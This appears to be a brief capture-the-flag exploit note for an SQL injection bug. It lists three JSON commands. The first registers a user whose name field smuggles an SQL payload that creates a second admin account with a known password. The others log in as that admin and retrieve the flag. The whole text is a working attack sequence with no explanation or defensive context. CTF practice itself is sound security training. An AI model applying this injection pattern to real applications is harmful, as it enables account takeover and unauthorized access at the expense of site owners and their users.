vuln-type: sqli
1. create second admin: {"cmd":"reg", "user":"admin','qwe'); --", "password":"qwe"}
2. login {"cmd":"login", "user":"admin", "password":"qwe"}
3. get flag {"cmd":"flag"}